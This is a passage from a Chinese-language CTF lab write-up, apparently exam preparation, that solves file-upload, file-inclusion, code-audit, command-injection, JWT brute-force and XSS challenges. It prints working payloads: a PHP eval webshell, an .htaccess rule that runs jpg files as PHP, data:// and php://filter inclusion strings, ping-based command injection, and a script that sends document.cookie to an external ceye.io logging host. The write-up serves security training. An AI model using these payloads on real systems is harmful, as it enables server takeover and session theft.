class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">308</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">307</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">307</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">305</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">305</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">306</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">305</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">297</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">298</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">303</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">307</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">50</span>:<span class="number">41</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">304</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">51</span>:<span class="number">05</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">325</span>B  <span class="operator">-</span> <span class="symbol">/css</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">211.103</span>.<span class="number">180.146</span>:<span class="number">15456</span><span class="operator">/</span>css<span class="symbol">/</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">51</span>:<span class="number">10</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">327</span>B  <span class="operator">-</span> <span class="symbol">/fonts</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">211.103</span>.<span class="number">180.146</span>:<span class="number">15456</span><span class="operator">/</span>fonts<span class="symbol">/</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">51</span>:<span class="number">15</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">466</span>B  <span class="operator">-</span> <span class="operator">/</span>js<span class="symbol">/</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">51</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">306</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">51</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">307</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">51</span>:<span class="number">39</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">328</span>B  <span class="operator">-</span> <span class="symbol">/upload</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">211.103</span>.<span class="number">180.146</span>:<span class="number">15456</span><span class="operator">/</span>upload<span class="symbol">/</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">51</span>:<span class="number">39</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">508</span>B  <span class="operator">-</span> <span class="operator">/</span>upload<span class="operator">/</span></span><br></pre></td></tr></table></figure></div>
<p>找到上传之后的位置 蚁剑连接<br>第四题：<br><img src="https://pic1.imgdb.cn/item/68b5b3c458cb8da5c86cdfa2.png"><br>提示php文件不能直接上传<br>还是先尝试一下其他几个后缀，发现phtml可以 估计就是过滤了php这三个字母<br><img src="https://pic1.imgdb.cn/item/68b5b42a58cb8da5c86cdfd8.png"><br>上传图片马提示 文件内容不支持， 用phpinfo()还是不行 估计是过滤了php标签，所以用script形式的马<br><code>&lt;script language=&quot;php&quot;&gt; @eval($_POST[&#39;cmd&#39;]); &lt;/script&gt;</code><br>然后还是在upload目录下面找到文件  用蚁剑连接<br>第五题：<br>还是只过滤了php  用其他后缀都可以成功上传，这里用php3 就可以成功连接上蚁剑<br>在网站目录下找到flag<br>第六题： 小明做了一个文件上传的页面，他将危险文件做了个黑名单，以此来杜绝危险文件的上传，但是他忘记了很严重的问题。想办法上传文件，拿到flag。<br>源码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里的问题是没有过滤htaccess<br>上传一个.htaccess文件，让上传的jpg文件以php格式解析</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;.jpg$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>上传了这个htaccess文件之后就给出了flag<br>第七题：用所学知识拿到根目录下的flag  学会好好利用<a href="http://ip:port/include.php界面">http://ip:port/include.php界面</a><br>看这个题目的意思 估计是要用文件包含了<br>先上传一个图片马 然后查看图片 得到图片路径 upload&#x2F;2020250901153953.jpg<br>然后利用include.php 用file参数传入图片路径  最后用蚁剑连接<br>第八题： 和第七题一模一样<br>第九题：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Dalock/article/details/149410208">Apache ActiveMQ 任意文件写入漏洞（CVE-2016-3088）复现利用</a><br>考察这个漏洞，根据这篇文章进行复现</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>第一题：<br>请在系统根目录下找到flag.txt文件并获取flag值<br>部分源码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>用file协议读取flag <code>file:///flag.txt</code><br>第二题：<br>通过url<code>/vul/fu1.php?file=view.html</code> 知道当前页面显示的实际上是view.html的内容，由于是一个php文件包含的，所以view.html也是以php文件来执行的  直接去访问一下原来的页面  然后查看页面源代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Hello&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">@<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\[(.*)\]/e&quot;</span>,<span class="string">&#x27;\\1&#x27;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>
<p>这里的正则表达式意思是匹配第一个中括号里面的内容，&#x2F;e表示执行其中的代码<br>base64其中的内容解码后是<code>[@eval(base64_decode($_POST[z0]));]</code> 这里z0参数会进行一次base64解码，所以要把执行的用base64编码一下 system(‘cat &#x2F;flag.php’);<br><code>Hello=&#39;123&#39;&amp;z0=c3lzdGVtKCdjYXQgL2ZsYWcucGhwJyk7</code> post发送这个数据 然后查看源代码得到flag<br><img src="https://pic1.imgdb.cn/item/68b6a10a58cb8da5c871f712.png"><br>第三题：<br><img src="https://pic1.imgdb.cn/item/68b6a15e58cb8da5c871fb01.png"><br>这里包含的是nisp 但是显示的是nisp.txt 所以会自动加上txt后缀<br>这里用data伪协议直接在url写入php插入代码，直接执行之后后缀就无所谓了<br><code>data://</code>被过滤需要用双写绕过<br><code>?page=dadata://ta://text/plain,&lt;?php system(&#39;cat /flag.php&#39;);?&gt;</code><br>第四题：<br>用<code>?file=php://filter/read=convert.base64-encode/resource=../key.flag</code> php伪协议用base64转换一下读取flag<br>第五题：<br>用data伪协议执行代码<br><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</code><br><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcud2FzaicpOyA/Pg==</code> 先用system(‘ls’&#x2F;); 找到flag文件名 然后读取</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>第一题：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);    </span><br><span class="line"><span class="variable">$a </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];   </span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$ret = strtolower(\&quot;<span class="subst">$a</span>\&quot;);&quot;</span>);   </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;   </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里只要用一个闭合就可以执行想要的命令了<br><code>?a=&quot;);system(&quot;ls ./</code><br><code>?a=&quot;);system(&quot;cat ./flag.cisp123</code><br>第二题：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]&lt;<span class="number">30</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too more&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里就是要求命令不能超过30个字符<br><code>/?1=find / -name &quot;flag*&quot; 2&gt;/dev/null</code> 找到flag所在文件<br><code>?1=cat /var/www/html/flag.nisp</code><br>第三题</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;   </span><br><span class="line"><span class="variable">$TEMP </span>= <span class="string">&quot;CISP&quot;</span>;   </span><br><span class="line"><span class="variable">$str </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];   </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>) === <span class="variable">$TEMP</span>)   &#123;       </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;   </span><br><span class="line">&#125;   </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>
<p>考察序列化<br>在本地环境中运行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;CISP&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>将输出的结果用get方式用str参数传入<br>第四题：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$v2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;w&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]) ? <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>) : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]) &#123;</span><br><span class="line">        (<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>] &gt; <span class="number">2020</span>) ? <span class="variable">$v1</span> = <span class="number">1</span> : <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>]) != <span class="number">5</span> <span class="keyword">or</span> !<span class="title function_ invoke__">is_array</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;cisp-pte&quot;</span>, <span class="variable">$a</span>[<span class="string">&quot;bar3&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> === <span class="literal">false</span> ? <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>) : <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$val</span> == <span class="string">&quot;cisp-pte&quot;</span> ? <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>) : <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$v2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$v1</span> &amp;&amp; <span class="variable">$v2</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
<p>按照题目的要求一步步分析<br>首先要传入一个参数w  w是一个json格式的参数并且w是一个数组<br>数组的bar1元素不能是数字 但是要大于2020  这里利用php的弱比较 用数字加字母 比较时候会自动转为数字<br>数组的bar2元素是一个数组，要有五个元素，并且这个bar2数组的第一个元素也是数组<br>bar3元素也是数组，数组中要有”cisp-pte”元素<br>bar2元素不能有”cisp-pte”<br><code>?w=&#123;&quot;bar1&quot;:&quot;2024a&quot;,&quot;bar2&quot;:[[&quot;a&quot;],[&quot;b&quot;],[&quot;c&quot;],[&quot;d&quot;],[&quot;e&quot;]],&quot;bar3&quot;:[&quot;test&quot;,&quot;cisp-pte&quot;,123]&#125;</code></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>第一题 ：<br><img src="https://pic1.imgdb.cn/item/68c2337a58cb8da5c89a202e.png"><br>可以执行一个ping命令 要拿到flag  可以用 &amp; 隔断 后面加上想要执行的命令<br>127.0.0.1 &amp; tac &#x2F;var&#x2F;www&#x2F;html&#x2F;key.flag cat被过滤了 要用tac<br>第二题：<br>和第一题一样都是验证主机存活命令 用|分割 这里过滤了cat 和 tac 可以用sort命令查看<br>127.0.0.1 | sort &#x2F;flag.php<br>第三题：<br>首先尝试ls 发现被过滤 然后在直接输入&#x2F;flag.php 发现也是被过滤的，猜测有关键字或者黑名单，用通配符&#x2F;flag.*就可以<br>用nl命令就可以查看<br><img src="https://pic1.imgdb.cn/item/68c394a558cb8da5c8a051ae.png" alt="|500"><br>第四题： 启动环境，找找看，flag在flag.php中，flag格式为：flag_nisp_xxxxxx，他隐藏的不浅啊<br>还是一个ping命令  用 | 分割 ls &#x2F; 找到一个nisp92234目录 flag.php在里面<br><code>127.0.0.1 | nl /nisp92234/flag.*</code></p>
<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>第一题：  请通过暴力破解登录成功后获取flag。<br>题目给了一个字典 ， 虽然网站这个有验证码 但是这个验证码就算不修改也能爆破<br>在burpsuite中的爆破模块爆破 加载字典<br>找到密码是abcd1234<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/7dd661365aa0efeb.png"><br>第二题：  进入管理员面板，删除mary，就能获得flag值了<br>这里先提供了一个测试账号，告诉我们当前的用户是user  既然给了测试账号还有角色，应该是要越权到admin用户<br>点击admin panel 然后在bp中拦截<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/14697e122706e076.png"><br>在bp中可以看到jwt的相关信息 tom这个用户的当前角色是user<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/a76d8de318476e85.png"><br>现在要把现在的jwt数据拿到hashcat中爆破得到密钥<br><code>D:\tool\hashcat-7.1.2&gt;hashcat.exe -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0b20iLCJyb2xlIjoidXNlciIsImNzcmYiOiI0NzkyNjEzNmIxNzZhNGU0IiwiZXhwIjoxNzU3NjU0Mjc0fQ.yvrDsISCNvMVd5JmHUyIbXQsd9ZtTl86zG0zifz7ehg &quot;D:\字典\xato-net-10-million-passwords-10000.txt&quot;</code><br>成功爆破出密钥secret1<br>在bp的jwt editor插件中生成一个jwt 这里k修改成密钥的base64编码格式<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/e56ab2161d119d34.png"><br>回到刚才拦截的包中，把role改成admin 然后点sign 用刚刚生成的key<br><img src="https://s3.bmp.ovh/imgs/2025/09/12/9d67f78e59142ba7.png"><br>然后进入admin面板里面 在删除的时候也重复上面的步骤 删除也需要admin的权限 然后拿到flag</p>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>第一题 ： 启动环境，想办法，以管理员身份打开首页，就能获得flag值了呢<br>先在ceye.io注册一个账号，然后再profile里拿到自己的一个域名<br>在留言板中写</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;http://eq76xx.ceye.io/log?&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span> + <span class="string">&#x27;&quot;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
